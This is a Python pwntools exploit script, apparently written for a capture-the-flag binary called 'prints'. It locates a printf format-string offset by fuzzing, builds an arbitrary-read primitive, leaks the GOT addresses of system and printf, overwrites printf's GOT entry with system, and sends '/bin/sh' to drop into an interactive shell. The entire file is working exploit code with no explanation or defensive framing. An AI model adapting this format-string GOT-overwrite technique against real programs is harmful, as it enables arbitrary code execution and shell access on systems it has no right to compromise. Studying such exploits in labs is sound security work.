
from pwn import *
import re
binary = context.binary = ELF('prints')
context.log_level = 'debug'


p = process(binary.path)
leaks = {}
for i in range(1, 80):
    p.send(b'AAAA%%%d$pBBBB' % i)
    a = p.read()
    mat = re.search(b'AAAA(.*)BBBB', a)
    if mat is None:
        continue
    leaks[i] = mat.groups()[0]


arg_off = [k for k, v in leaks.items() if v.find(b'41414141') != -1][0]

read_fuzz_results = {}

valid_addr = binary.address
valid_bytes = b'\x7fELF'

# brute force offset for arb read/write
for read_off in range(8):
    curr_off = arg_off + read_off
    res = {}
    # brute force necessary padding
    for num_pad in range(16):
        v = process(binary.path)
        pad = num_pad*b'B'
        v.send(b'AAAA%%%d$s' %curr_off + pad + p64(valid_addr))
        try:
            a = v.read()
        except:
            continue
        # only keep results that contain non-null contents and also include footer
        mat = re.search(b'AAAA(.+)B+Print', a)
        if mat is not None:
            leakstr = mat.groups()[0]
            if leakstr.find(b'(null)') == -1:
                res[num_pad] =  leakstr
        v.close()
    if res:
        read_fuzz_results[curr_off] = res

valid_leak_values = []
for read_off, read_off_res in read_fuzz_results.items():
    for num_pad, leak_res in read_off_res.items():
        if leak_res.find(valid_bytes) != -1:
            valid_leak_values.append((read_off, num_pad))

read_off, num_pad = valid_leak_values[0]
pad = num_pad*b'B'
ARB_READ_FMT = b'AAAA%%%d$s' %read_off + pad
READ_MATCH_PAT = b'AAAA(.+)' + pad

def arb_read_str(p, addr):
    p.send(ARB_READ_FMT + p64(addr))
    a = p.read()
    mat = re.search(READ_MATCH_PAT, a)
    if mat is None:
        return b''
    return mat.groups()[0]


libc_system_bytes = arb_read_str(p, binary.sym['got.system'])
libc_system_bytes = libc_system_bytes.ljust(binary.bytes, b'\x00')
libc_system = u64(libc_system_bytes)
libc_printf_bytes = arb_read_str(p, binary.sym['got.printf'])
libc_printf_bytes = libc_printf_bytes.ljust(binary.bytes, b'\x00')
libc_printf = u64(libc_printf_bytes)

write_bytes = b''
for sys_b, print_b in zip(libc_system_bytes[::-1], libc_printf_bytes[::-1]):
    if sys_b != print_b:
        write_bytes += bytes([sys_b])

write_bytes = write_bytes[::-1]

def exec_fmt(payload):
    p.send(payload)
    res = p.read()
    return res

autofmt = FmtStr(exec_fmt, offset=arg_off)
autofmt.write(binary.sym['got.printf'], write_bytes)
autofmt.execute_writes()

p.send(b'/bin/sh\x00')
p.interactive()
